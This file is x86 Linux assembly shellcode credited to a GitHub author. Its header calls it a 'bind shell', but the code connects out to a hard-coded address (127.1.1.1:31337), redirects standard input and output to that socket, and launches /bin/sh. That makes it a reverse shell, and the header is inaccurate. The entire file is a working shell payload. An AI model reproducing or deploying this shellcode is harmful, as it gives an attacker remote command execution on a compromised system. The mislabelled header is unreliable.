/*
 * bind shell
 * github: A1phaZer0
 */

.intel_syntax noprefix
.section .text
.global _start

_start:
    /* 
     * create socket
     * socket(PF_INET, SOCK_STREAM, 0);
     */
    xor eax, eax
    push eax        /* protocol = 0 */
    inc eax
    push eax        /* SOCK_STREAM == 1 */
    inc eax
    push eax        /* PF_INET == 2 */
    mov ecx, esp
    xor ebx, ebx    
    inc ebx         /* SYS_SOCKET */
    mov al, 0x66
    int 0x80        /* sys_socketall() */

    /* 
     * connect to host 
     * connect(sockfd, (struct sockaddr *)host, sizeof(struct sockaddr));
     */
    mov esi, eax    /* store sockfd to esi */
    mov eax, 0x0101017f
    push eax        /* sin_addr 127.1.1.1 */
    mov ax, 0x697A  /* order switched 31337(0x7a69) */ 
    push ax         /* sin_port */
    xor eax, eax
    mov al, 0x2
    push ax         /* AF_INET only used by host so no network byte order */
    mov ebx, esp    /* sockaddr_in pointer */
    mov al, 0x10    /* length */
    push eax        
    push ebx        
    push esi        
    mov ecx, esp    /* args */
    xor ebx,ebx
    mov bl, 0x3     /* SYS_CONNECT */
    mov al, 0x66    /* sys_sockteall() */
    int 0x80


    /* 
     * file descriptor duplication 
     * dup2(old, new);
     */
    mov ebx, esi    /* sockfd */
    xor eax, eax
    xor edx, edx
    xor ecx, ecx
    mov cl, 0x3
LOOP:
    dec ecx
    mov al, 0x3f    /* sys_dup2 */
    int 0x80
    cmp ecx, edx
    jnz LOOP        /* loop 3 times */

    /* execve("/bin/sh", NULL, NULL); */
    xor eax, eax
    push eax	    /* \x00 */
    push 0x68732f2f /* "//sh" */
    push 0x6e69622f /* "/bin" */
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov al, 0xb
    int 0x80



